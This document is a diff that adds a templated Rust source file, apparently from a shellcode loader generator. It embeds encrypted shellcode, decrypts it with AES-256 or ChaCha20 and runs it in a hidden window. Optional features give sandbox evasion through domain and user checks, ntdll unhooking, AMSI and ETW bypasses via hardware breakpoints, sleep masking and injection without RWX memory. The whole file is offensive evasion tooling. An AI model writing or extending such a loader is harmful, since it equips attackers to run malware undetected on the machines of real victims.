@@ -1,0 +1,50 @@
+#![windows_subsystem = "windows"]
+extern crate scaffold;
+
+fn {{ v.fn_run }}() {
+    unsafe {
+        {%- if "SandboxDomain" in feature_names %}
+        if !scaffold::sandbox::domain::is_domain_joined() { return; }
+        {%- endif %}
+        {%- if "SandboxUser" in feature_names %}
+        if !scaffold::sandbox::usercheck::looks_real() { return; }
+        {%- endif %}
+        {%- if "UnhookDisk" in feature_names %}
+        scaffold::evasion::unhook::unhook_ntdll_disk();
+        {%- endif %}
+        {%- if "AmsiHwbp" in feature_names %}
+        scaffold::bypass::amsi_hwbp::install_amsi_bypass();
+        {%- endif %}
+        {%- if "EtwHwbp" in feature_names %}
+        scaffold::bypass::etw_hwbp::install_etw_bypass();
+        {%- endif %}
+
+        let {{ v.var_shellcode }}: &[u8] = &[
+            {%- for byte in config.shellcode_hex | hex_bytes %}{{ byte }},{% endfor %}
+        ];
+        let {{ v.var_key }}: [u8; 32] = [
+            {%- for byte in config.key_hex | hex_bytes %}{{ byte }},{% endfor %}
+        ];
+        let {{ v.var_iv }}: [u8; 16] = [
+            {%- for byte in config.iv_hex | hex_bytes %}{{ byte }},{% endfor %}
+        ];
+
+        {%- if config.encryption == "Aes256" %}
+        let {{ v.var_ptr }} = scaffold::crypto::decrypt_aes256(
+            {{ v.var_shellcode }}, &{{ v.var_key }}, &{{ v.var_iv }}
+        ).unwrap();
+        {%- else %}
+        let {{ v.var_ptr }} = scaffold::crypto::decrypt_chacha20(
+            {{ v.var_shellcode }}, &{{ v.var_key }}, &{{ v.var_iv }}
+        ).unwrap();
+        {%- endif %}
+
+        {%- if "SleepEncrypt" in feature_names %}
+        scaffold::evasion::sleep_mask::masked_sleep(3000);
+        {%- endif %}
+
+        scaffold::inject::exec::run_no_rwx(&{{ v.var_ptr }});
+    }
+}
+
+fn main() { {{ v.fn_run }}(); }
